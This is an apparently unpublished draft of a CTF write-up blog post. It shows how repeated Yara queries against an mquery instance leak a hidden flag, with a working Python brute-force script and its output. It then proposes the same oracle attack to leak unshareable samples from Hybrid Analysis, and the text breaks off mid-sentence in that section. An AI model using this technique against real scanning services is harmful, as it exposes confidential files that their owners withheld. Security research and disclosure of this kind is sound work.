---
title: Using Yara to Leak Sensitive Data
author: Megabeets
type: post
date: -001-11-30T00:00:00+00:00
draft: true
url: /?p=1700
categories:
  - Uncategorized

---
During CONFidence Teaser CTF, one specific task caught my interest. Not because it was hard or complicated &#8211; it wasn&#8217;t, but because the concept behind it was interesting and relevant to my day-to-day work as a malware researcher. 

In this short article, I will show a **highly esoteric**, not to say **trivial**, concept in which you can leak the content of &#8220;sensitive&#8221; files on systems where scanning the files with Yara is allowed, but downloading the files is not possible. Not only that I&#8217;ll show how it was used, as an **intended solution**, to solve the &#8220;Hidden Flag&#8221; challenge on the CTF, but will also demonstrate how it can be used to retrieve the data of TLP;RED, or un-downloadable files on premium services such as Hybrid-Analysis, where the major limitation is the bandwidth.

Let&#8217;s not move too fast and start from the beginning, the CTF challenge. On &#8220;Hidden-Flag&#8221;, the most solved challenge in this CTF, we are given an online instance of [mquery][1], a &#8220;YARA malware query accelerator&#8221;. In other words, the system lets you run your Yara rules on a repository of files, very fast. The flag, as it seems, exists in the content of a file found in the corpus of files that are indexed and scanned by _mquery_. As a malware researcher, and as a [cert.pl][2] old fanboy, I was already familiar with _mquery_ and experienced with using it. 

The initial idea was to extract the flag using boolean queries of Yara rules. To prove that this concept really works, I started from this sample rule:

<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">rule test {
  strings:
    $flag = "p4{"
  condition:
    $flag
}</pre>

&#8220;p4{&#8221; is the known prefix for flags in this CTF, and indeed, this simple rule showed that the concept is potentially possible and we can now start slowly retrieving the flag. <figure class="wp-block-image size-large">

<img src="../uploads/mquery-screenshot.png" /> </figure> 

In order to retrieve the rest of the flag, we can slowly &#8220;brute force&#8221; it character by character, hoping there will not be any &#8220;brute force&#8221; mitigation or similar limitation. Since I am familiar with the project, I know it has a REST API we can use for our help. For those of you who weren&#8217;t familiar with _mquery_ before, it can be figured out from the [tests][3].

And indeed, we can quickly write a script to brute force the flag, character by character.

<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">import string
import requests

QUERY_URL = "http://hidden.zajebistyc.tf/api/query/high"
MATCHES_URL = "http://hidden.zajebistyc.tf/api/matches/{}?offset=0&limit=50"

def request_query (query):
    res = requests.post(QUERY_URL, json={"method": "query", "raw_yara": query})
    res.raise_for_status()
    query_hash = res.json()["query_hash"]
    res = requests.get(MATCHES_URL.format(query_hash))
    if res.json()["job"]["status"] == "done":
        return res


# Define a rule tempplate

test_yara = """
rule find_flag {{
    strings:
        $flag = "{0}"
    condition:
        $flag
}}
"""

# Generate a list of potential characters
potential_chars = "-_}"+string.ascii_lowercase+string.digits+string.ascii_uppercase+"@!"  

# Start from the known prefix of the flag

flag = "p4{"

while True:
    print("[+] Found:",flag)
    for c in potential_chars:
        res = request_query(test_yara.format(flag + c))
        if len(res.json()["matches"]) > 0:
            flag += c
            break
    if c == "}":
        break

print("[+] Flag:", flag)

# flag is "p4{ind3x1ng-l3ak5}"</pre>

Let&#8217;s run the script and see the results come quickly:

<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ python3 solution.py

[+] Found: p4{
[+] Found: p4{i
[+] Found: p4{in
[+] Found: p4{ind
[+] Found: p4{ind3
[+] Found: p4{ind3x
[+] Found: p4{ind3x1
[+] Found: p4{ind3x1n
[+] Found: p4{ind3x1ng
[+] Found: p4{ind3x1ng-
[+] Found: p4{ind3x1ng-l
[+] Found: p4{ind3x1ng-l3
[+] Found: p4{ind3x1ng-l3a
[+] Found: p4{ind3x1ng-l3ak
[+] Found: p4{ind3x1ng-l3ak5
[+] Flag: p4{ind3x1ng-l3ak5}
</pre>

### Real-life implications

While this CTF challenge wasn&#8217;t the hardest, to say the least, it indeed shows an interesting concept. For a desperate and motivated-enough person, it is possible to leak some data that wasn&#8217;t meant to be shared with them. But to make this happen, it requires a very niche set-up in which file storage can be scanned with Yara (or any other scanning engine) but some or all the files cannot be downloaded. Esoteric as it sounds, it can happen. The fact is, that this is the exact situation that Cert Polska is dealing with and on which the aforementioned challenge is based. Having a TLP;RED samples in their repository prevents the Polish Cert to publicly open their own _mquery_ instance to the public or other organizations. Having access to such Yara scanning engine on a repository with unshareable samples is a risk they refuse to take. `mquery` is not the only platform to let you scan files using Yara, there are more &#8211; some of them are even commercial.

### Hybrid Analysis

CrowdStrike&#8217;s Hybrid-Analysis is a free automated malware analysis service. Its main feature is a very popular sandbox that is commonly used by the community. Community members upload samples to the platform, and the samples being analyzed in the sandbox. The user are choosing whether they wan to share the binary sample with the community or not. If they choose not to, the analysis of the file is still available to the community, so is the meta-data of the file. The sample itself, of course, is marked as unshareable and cannot be accessed by the community. Finding such &#8220;not-for-share&#8221; files is very easy because Hybrid Analysis highlights these files and marks them visibly.

One of the less-familiar features of Hybrid Analysis is their super-fast Yara scanner. It lets the users the ability to &#8220;Hunt samples matching YARA rules at the byte level.&#8221;. Essentially, users can create their Yara rule and scan it on the entire sample repository of one of the most popular malware analysis services out there. You see where I&#8217;m going at, right? If some samples are not shared publicly, but we do have their metadata, including their hash and some strings from them, we can easily start leaking the entire binary, or parts of it as we wish. Adding that to the fact that Hybrid Analysis&#8217; Yara scanner is very fast, we can run a Yara query 



<div class="nf-post-footer">
  <p style="text-align: right">
    <a href="https://www.megabeets.net/about.html#vegan"><img src="../uploads/megabeets_inline_logo.png" />Eat Veggies</a>
  </p>
</div>

 [1]: https://github.com/CERT-Polska/mquery
 [2]: https://www.cert.pl/en/
 [3]: https://github.com/CERT-Polska/mquery/blob/master/src/tests/test_api.py